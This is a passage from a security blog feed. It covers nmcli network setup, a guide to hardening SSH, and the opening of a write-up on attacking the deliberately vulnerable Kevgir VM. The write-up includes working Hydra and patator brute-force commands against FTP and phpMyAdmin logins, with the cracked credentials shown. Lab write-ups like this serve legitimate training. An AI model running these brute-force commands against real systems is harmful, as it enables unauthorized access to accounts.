</span><span class='line'>ARGUMENTS := [id | uuid | path] &lt;ID&gt; ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+
</span><span class='line'>
</span><span class='line'>Modify one or more properties of the connection profile.
</span><span class='line'>The profile is identified by its name, UUID or D-Bus path. For multi-valued
</span><span class='line'>properties you can use optional '+' or '-' prefix to the property name.
</span><span class='line'>The '+' sign allows appending items instead of overwriting the whole value.
</span><span class='line'>The '-' sign allows removing selected items instead of the whole value.
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>nmcli con mod home-wifi wifi.ssid rakosnicek
</span><span class='line'>nmcli con mod em1-1 ipv4.method manual ipv4.addr "192.168.1.2/24, 10.10.1.5/8"
</span><span class='line'>nmcli con mod em1-1 +ipv4.dns 8.8.4.4
</span><span class='line'>nmcli con mod em1-1 -ipv4.dns 1
</span><span class='line'>nmcli con mod em1-1 -ipv6.addr "abbe::cafe/56"
</span><span class='line'>nmcli con mod bond0 +bond.options mii=500
</span><span class='line'>nmcli con mod bond0 -bond.options downdelay</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add a DNS server to an existing connection</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con show static-con | grep ipv4.dns
</span><span class='line'>ipv4.dns:                               
</span><span class='line'>ipv4.dns-search:                        
</span><span class='line'>ipv4.dns-options:                       (default)
</span><span class='line'>ipv4.dns-priority:                      0
</span><span class='line'>nmcli con mod static-con ipv4.dns 8.8.8.8
</span><span class='line'>nmcli con up static-con
</span><span class='line'>nmcli con show static-con | grep ipv4.dns
</span><span class='line'>ipv4.dns:                               8.8.8.8
</span><span class='line'>ipv4.dns-search:                        
</span><span class='line'>ipv4.dns-options:                       (default)
</span><span class='line'>ipv4.dns-priority:                      0</span></code></pre></td></tr></table></div></figure>


<h3>Learn more</h3>

<ul>
<li><a href="https://developer.gnome.org/NetworkManager/">NetworkManager documentation</a></li>
<li><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/networking_guide/">RHEL7 networking guide</a></li>
<li><a href="https://www.certdepot.net/rhel7-get-started-nmcli/">CertDepot NetworkManager guide</a></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ____________________________________
</span><span class='line'>/ You're currently going through a   \
</span><span class='line'>| difficult transition period called |
</span><span class='line'>\ "Life."                            /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Securing SSH]]></title>
    <link href="http://chousensha.github.io/blog/2018/01/05/lfcs-prep-securing-ssh/"/>
    <updated>2018-01-05T16:30:55-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/01/05/lfcs-prep-securing-ssh</id>
    <content type="html"><![CDATA[<p>SSH-ing between various systems is something you will definitely be doing a lot in infosec. So today I&rsquo;ll quickly go over an exam objective of configuring SSH for key based authentication and disabling root logins for extra security.</p>

<!-- more -->


<p>First of all, let&rsquo;s confirm that I can SSH to my machine as root and login with root&rsquo;s password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@192.168.217.129
</span><span class='line'>The authenticity of host '192.168.217.129 (192.168.217.129)' can't be established.
</span><span class='line'>ECDSA key fingerprint is SHA256:20TtBMwQAz9KAEK2mApqOksugeZ2yi8oecLRKz8RwB4.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added '192.168.217.129' (ECDSA) to the list of known hosts.
</span><span class='line'>root@192.168.217.129's password: 
</span><span class='line'>Last login: Fri Jan  5 14:04:25 2018
</span><span class='line'>[root@CentOS7 ~]# </span></code></pre></td></tr></table></div></figure>


<p>The CentOS server&rsquo;s public key has been added to <code>~/.ssh/known_hosts</code> on my client machine, and I was able to login as root with no problem. Now it&rsquo;s time to change these dangerous defaults. On the client, generate a new pair of keys:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-keygen
</span><span class='line'>Generating public/private rsa key pair.
</span><span class='line'>Enter file in which to save the key (/root/.ssh/id_rsa): 
</span><span class='line'>Enter passphrase (empty for no passphrase): 
</span><span class='line'>Enter same passphrase again: 
</span><span class='line'>Your identification has been saved in /root/.ssh/id_rsa.
</span><span class='line'>Your public key has been saved in /root/.ssh/id_rsa.pub.
</span><span class='line'>The key fingerprint is:
</span><span class='line'>SHA256:OLHfszGKJK7wPNhc6OLZv8NeMKOIDuV0OHmBeynLLVI root@kali
</span><span class='line'>The key's randomart image is:
</span><span class='line'>+---[RSA 2048]----+
</span><span class='line'>|                 |
</span><span class='line'>|   .             |
</span><span class='line'>|  . . .          |
</span><span class='line'>|   + o +         |
</span><span class='line'>|  E.=++ S        |
</span><span class='line'>|.*oOo +o .       |
</span><span class='line'>|=*=o+ ... =      |
</span><span class='line'>|==Bo =.. . =     |
</span><span class='line'>|.=+++++ . .      |
</span><span class='line'>+----[SHA256]-----+</span></code></pre></td></tr></table></div></figure>


<p>Now you have a private and public key inside the .ssh directory. Take a look at their permissions:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-------  1 root root 1675 Jan  5 16:10 id_rsa
</span><span class='line'>-rw-r--r--  1 root root  391 Jan  5 16:10 id_rsa.pub</span></code></pre></td></tr></table></div></figure>


<p>The private key has read and write permissions only for the owner (600), while the public key has read/write permissions for the owner, and read also for group and others (644).</p>

<p>The public key won&rsquo;t do any good sitting around on the client machine, it needs to be copied to the server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-copy-id root@192.168.217.129
</span><span class='line'>The authenticity of host '192.168.217.129 (192.168.217.129)' can't be established.
</span><span class='line'>ECDSA key fingerprint is SHA256:20TtBMwQAz9KAEK2mApqOksugeZ2yi8oecLRKz8RwB4.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
</span><span class='line'>/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
</span><span class='line'>root@192.168.217.129's password: 
</span><span class='line'>
</span><span class='line'>Number of key(s) added: 1
</span><span class='line'>
</span><span class='line'>Now try logging into the machine, with:   "ssh 'root@192.168.217.129'"
</span><span class='line'>and check to make sure that only the key(s) you wanted were added.</span></code></pre></td></tr></table></div></figure>


<p>If you get the error <strong>sign_and_send_pubkey: signing failed: agent refused operation</strong> when trying to SSH to the server, run <em>*ssh-add</em> to add the private key identities to the authentication agent. You can then verify they were added:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-add -l
</span><span class='line'>2048 SHA256:OLHfszGKJK7wPNhc6OLZv8NeMKOIDuV0OHmBeynLLVI /root/.ssh/id_rsa (RSA)
</span><span class='line'>2048 SHA256:OLHfszGKJK7wPNhc6OLZv8NeMKOIDuV0OHmBeynLLVI root@kali (RSA)</span></code></pre></td></tr></table></div></figure>


<p>Now you should be able to login with the public key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@192.168.217.129
</span><span class='line'>Last login: Fri Jan  5 15:06:34 2018 from 192.168.217.132
</span><span class='line'>[root@CentOS7 ~]# </span></code></pre></td></tr></table></div></figure>


<p>That worked, but we don&rsquo;t want root to be able to directly SSH into our host. So edit the <code>/etc/ssh/sshd_config</code> file on the server. The default settings are commented, and you can add your own changes and leave them uncommented to override the defaults. I added the following to disable root login and password authentication:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PermitRootLogin no
</span><span class='line'>PasswordAuthentication no</span></code></pre></td></tr></table></div></figure>


<p>Restart ssh and try to login again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@192.168.217.129
</span><span class='line'>root@192.168.217.129: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).</span></code></pre></td></tr></table></div></figure>


<p>In practice, you would generate your keys for an account that you will use on that system and if needed, give it sudo privileges to do the work you need.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ You learn to write as if to someone \
</span><span class='line'>| else because NEXT YEAR YOU WILL BE  |
</span><span class='line'>\ "SOMEONE ELSE."                     /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pwning Kevgir]]></title>
    <link href="http://chousensha.github.io/blog/2017/12/02/pwning-kevgir/"/>
    <updated>2017-12-02T14:08:05-05:00</updated>
    <id>http://chousensha.github.io/blog/2017/12/02/pwning-kevgir</id>
    <content type="html"><![CDATA[<p>Kevgir is a machine vulnerable to multiple web application vulnerabilities designed by the <em>canyoupwnme</em> team. So..can we pwn it? Let&rsquo;s see!</p>

<!-- more -->


<p>Nmap results reveal that we&rsquo;ll have lots of targets to attack. So I&rsquo;m going to break the format a little bit, and present the results for each port, along with the ways to hack it.</p>

<h2>Port 25 FTP bruteforce with Hydra</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>25/tcp    open  ftp         vsftpd 3.0.2
</span><span class='line'>|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D</span></code></pre></td></tr></table></div></figure>


<p>Couldn&rsquo;t find exploits for this and no anonymous access, so I tried the bruteforce route. Decided to try some other lists from the myriad available on Kali, and wasn&rsquo;t disappointed when I put Hydra to work:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/mirai_pass.txt ftp://192.168.217.128:25
</span><span class='line'>Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-02 15:08:02
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 16 tasks, 4816 login tries (l:112/p:43), ~301 tries per task
</span><span class='line'>[DATA] attacking ftp://192.168.217.128:25/
</span><span class='line'>[25][ftp] host: 192.168.217.128   login: admin   password: admin</span></code></pre></td></tr></table></div></figure>


<p>I used the credentials to log to the FTP server, but didn&rsquo;t find anything particularly interesting. Let&rsquo;s move on!</p>

<h2>Port 80 phpmyadmin bruteforce with patator</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: Kevgir VM</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/80.jpg" title="port 80" alt="port 80 apache"></p>

<p>Ran Nikto against it and found phpmyadmin running on it. Now I decided to try a new tool to bruteforce the phmyadmin page. Enter Patator!</p>

<h3>patator</h3>

<p>Homepage: <a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a></p>

<blockquote><p>Patator is a Python multi-purpose brute-forcer, with a modular design and a flexible usage.</p></blockquote>

<p>Let&rsquo;s see the available modules:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Patator v0.6 (http://code.google.com/p/patator/)
</span><span class='line'>Usage: patator module --help
</span><span class='line'>
</span><span class='line'>Available modules:
</span><span class='line'>  + ftp_login     : Brute-force FTP
</span><span class='line'>  + ssh_login     : Brute-force SSH
</span><span class='line'>  + telnet_login  : Brute-force Telnet
</span><span class='line'>  + smtp_login    : Brute-force SMTP
</span><span class='line'>  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
</span><span class='line'>  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
</span><span class='line'>  + finger_lookup : Enumerate valid users using Finger
</span><span class='line'>  + http_fuzz     : Brute-force HTTP
</span><span class='line'>  + pop_login     : Brute-force POP3
</span><span class='line'>  + pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)
</span><span class='line'>  + imap_login    : Brute-force IMAP4
</span><span class='line'>  + ldap_login    : Brute-force LDAP
</span><span class='line'>  + smb_login     : Brute-force SMB
</span><span class='line'>  + smb_lookupsid : Brute-force SMB SID-lookup
</span><span class='line'>  + rlogin_login  : Brute-force rlogin
</span><span class='line'>  + vmauthd_login : Brute-force VMware Authentication Daemon
</span><span class='line'>  + mssql_login   : Brute-force MSSQL
</span><span class='line'>  + oracle_login  : Brute-force Oracle
</span><span class='line'>  + mysql_login   : Brute-force MySQL
</span><span class='line'>  + mysql_query   : Brute-force MySQL queries
</span><span class='line'>  + pgsql_login   : Brute-force PostgreSQL
</span><span class='line'>  + vnc_login     : Brute-force VNC
</span><span class='line'>  + dns_forward   : Forward lookup names
</span><span class='line'>  + dns_reverse   : Reverse lookup subnets
</span><span class='line'>  + snmp_login    : Brute-force SNMP v1/2/3
</span><span class='line'>  + unzip_pass    : Brute-force the password of encrypted ZIP files
</span><span class='line'>  + keystore_pass : Brute-force the password of Java keystore files
</span><span class='line'>  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
</span><span class='line'>  + tcp_fuzz      : Fuzz TCP services
</span><span class='line'>  + dummy_test    : Testing module</span></code></pre></td></tr></table></div></figure>


<p>The Github page has examples for various modules. For this case, I assumed the username will be root, and I adapted a password file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat root_userpass.txt | awk '{print $2}' &gt; ~/Desktop/rootpass.txt</span></code></pre></td></tr></table></div></figure>


<p>The original file had lines of the format <em>root password</em>, so I only selected the second field of the passwords and created a new file for patator. Now I needed to learn more about the patator options:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>patator http_fuzz --help
</span><span class='line'>Patator v0.6 (http://code.google.com/p/patator/)
</span><span class='line'>Usage: http_fuzz &lt;module-options ...&gt; [global-options ...]
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  http_fuzz url=http://10.0.0.1/FILE0 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500
</span><span class='line'>  http_fuzz url=http://10.0.0.1/manager/html user_pass=COMBO00:COMBO01 0=combos.txt -x ignore:code=401
</span><span class='line'>  http_fuzz url=http://10.0.0.1/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
</span><span class='line'>
</span><span class='line'>Module options:
</span><span class='line'>  url           : target url (scheme://host[:port]/path?query)
</span><span class='line'>  body          : body data
</span><span class='line'>  header        : use custom headers
</span><span class='line'>  method        : method to use [GET | POST | HEAD | ...]
</span><span class='line'>  auto_urlencode: automatically perform URL-encoding [1|0]
</span><span class='line'>  user_pass     : username and password for HTTP authentication (user:pass)
</span><span class='line'>  auth_type     : type of HTTP authentication [basic | digest | ntlm]
</span><span class='line'>  follow        : follow any Location redirect [0|1]
</span><span class='line'>  max_follow    : redirection limit [5]
</span><span class='line'>  accept_cookie : save received cookies to issue them in future requests [0|1]
</span><span class='line'>  http_proxy    : HTTP proxy to use (host:port)
</span><span class='line'>  ssl_cert      : client SSL certificate file (cert+key in PEM format)
</span><span class='line'>  timeout_tcp   : seconds to wait for a TCP handshake [10]
</span><span class='line'>  timeout       : seconds to wait for a HTTP response [20]
</span><span class='line'>  before_urls   : comma-separated URLs to query before the main request
</span><span class='line'>  before_egrep  : extract data from the before_urls response to place in the main request
</span><span class='line'>  after_urls    : comma-separated URLs to query after the main request
</span><span class='line'>  max_mem       : store no more than N bytes of request+response data in memory [-1 (unlimited)]
</span><span class='line'>  persistent    : use persistent connections [1|0] 
</span><span class='line'>
</span><span class='line'>Global options:
</span><span class='line'>  --version            show program's version number and exit
</span><span class='line'>  -h, --help           show this help message and exit
</span><span class='line'>
</span><span class='line'>  Execution:
</span><span class='line'>    -x arg             actions and conditions, see Syntax below
</span><span class='line'>    --start=N          start from offset N in the wordlist product
</span><span class='line'>    --stop=N           stop at offset N
</span><span class='line'>    --resume=r1[,rN]*  resume previous run
</span><span class='line'>    -e arg             encode everything between two tags, see Syntax below
</span><span class='line'>    -C str             delimiter string in combo files (default is ':')
</span><span class='line'>    -X str             delimiter string in conditions (default is ',')
</span><span class='line'>
</span><span class='line'>  Optimization:
</span><span class='line'>    --rate-limit=N     wait N seconds between tests (default is 0)
</span><span class='line'>    --max-retries=N    skip payload after N failures (default is 4) (-1 for
</span><span class='line'>                       unlimited)
</span><span class='line'>    -t N, --threads=N  number of threads (default is 10)
</span><span class='line'>
</span><span class='line'>  Logging:
</span><span class='line'>    -l DIR             save output and response data into DIR
</span><span class='line'>    -L SFX             automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX
</span><span class='line'>                       (DIR defaults to '/tmp/patator')
</span><span class='line'>
</span><span class='line'>  Debugging:
</span><span class='line'>    -d, --debug        enable debug messages
</span><span class='line'>
</span><span class='line'>Syntax:
</span><span class='line'> -x actions:conditions
</span><span class='line'>
</span><span class='line'>    actions    := action[,action]*
</span><span class='line'>    action     := "ignore" | "retry" | "free" | "quit" | "reset"
</span><span class='line'>    conditions := condition=value[,condition=value]*
</span><span class='line'>    condition  := "code" | "size" | "time" | "mesg" | "fgrep" | "egrep" | "clen"
</span><span class='line'>
</span><span class='line'>    ignore      : do not report
</span><span class='line'>    retry       : try payload again
</span><span class='line'>    free        : dismiss future similar payloads
</span><span class='line'>    quit        : terminate execution now
</span><span class='line'>    reset       : close current connection in order to reconnect next time
</span><span class='line'>
</span><span class='line'>    code        : match status code
</span><span class='line'>    size        : match size (N or N-M or N- or -N)
</span><span class='line'>    time        : match time (N or N-M or N- or -N)
</span><span class='line'>    mesg        : match message
</span><span class='line'>    fgrep       : search for string in mesg
</span><span class='line'>    egrep       : search for regex in mesg
</span><span class='line'>    clen        : match Content-Length header (N or N-M or N- or -N)
</span><span class='line'>
</span><span class='line'>For example, to ignore all redirects to the home page:
</span><span class='line'>... -x ignore:code=302,fgrep='Location: /home.html'
</span><span class='line'>
</span><span class='line'> -e tag:encoding
</span><span class='line'>
</span><span class='line'>    tag        := any unique string (eg. T@G or _@@_ or ...)
</span><span class='line'>    encoding   := "url" | "sha1" | "md5" | "hex" | "b64"
</span><span class='line'>
</span><span class='line'>    url         : url encode
</span><span class='line'>    sha1        : hash in sha1
</span><span class='line'>    md5         : hash in md5
</span><span class='line'>    hex         : encode in hexadecimal
</span><span class='line'>    b64         : encode in base64
</span><span class='line'>
</span><span class='line'>For example, to encode every password in base64:
</span><span class='line'>... host=10.0.0.1 user=admin password=_@@_FILE0_@@_ -e _@@_:b64
</span><span class='line'>
</span><span class='line'>Please read the README inside for more examples and usage information.</span></code></pre></td></tr></table></div></figure>


<p>Luckily, on the Github page there is an example of phpmyadmin bruteforcing that I could adapt:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'</span></code></pre></td></tr></table></div></figure>


<p>And we have the password!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>patator http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
</span><span class='line'>17:17:27 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2017-12-02 17:17 EST
</span><span class='line'>17:17:27 patator    INFO -                                                                              
</span><span class='line'>17:17:27 patator    INFO - code size:clen       time | candidate                          |   num | mesg
</span><span class='line'>17:17:27 patator    INFO - -----------------------------------------------------------------------------
</span><span class='line'>17:17:27 patator    INFO - 200  9865:7910      0.366 |                                    |     1 | HTTP/1.1 200 OK
</span><span class='line'>17:17:29 patator    INFO - 200  48618:-1       0.938 | toor                               |    34 | HTTP/1.1 200 OK
</span><span class='line'>17:17:29 patator    INFO - Hits/Done/Skip/Fail/Size: 2/52/0/0/52, Avg: 21 r/s, Time: 0h 0m 2s</span></code></pre></td></tr></table></div></figure>


<p>Inside there are multiple databases, but at this point, I moved on to the next.</p>

<h2>Cracking ZIP archives</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>111/tcp   open  rpcbind     2-4 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
